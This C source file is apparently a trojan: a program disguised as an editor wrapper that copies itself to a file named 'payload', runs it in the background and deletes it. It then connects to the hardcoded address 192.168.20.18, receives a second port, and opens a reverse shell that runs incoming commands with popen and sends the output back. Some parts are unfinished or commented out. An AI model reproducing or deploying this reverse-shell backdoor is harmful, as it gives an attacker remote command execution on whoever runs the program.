#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <limits.h>

int main (int argc, char *argv[]) {
    /*char args[100] = "EDITOR ";
    for (int i = 1;i<argc;i++){
        strcat(args, argv[i]);
        if (i != argc-1){
            strcat(args, " ");
        }
    }
    if (access("payload", F_OK) != 0 ) {
        system("cp a.out payload");
        system("./payload &");
        system("rm payload");
    } else {
        establishConnection(5003, 0);
    }
    system(args);*/
    
}

int establishConnection(int port, int shell) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Socket creation error \n");
        return -1;
    }
   
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) 
    {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        printf("\nConnection Failed \n");
        return -1;
    }
    //send(sock , hello , strlen(hello) , 0 );
    //printf("Hello message sent\n");
    
    if (shell == 1){
        while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
            exeCmd(buffer);
            char line[1024];
            FILE* fp = popen(buffer,"r");
            while((fgets(line, 1024, fp))) {
                write(sock , line , strlen(line));
                //printf("\n[%s]",line);
            }
            //write(sock, client_message , strlen(client_message));
        }
        printf("Connection closed");
    } else {
        valread = read( sock , buffer, 1024);
        establishConnection(atoi(buffer), 1);
    }
    /*printf("uhh");
    char str[1024];
    printf(buffer);
    printf("%s\n",buffer );*/
    return 0;
}

void exeCmd(char* cmd) {
    char line[2048];
    
}
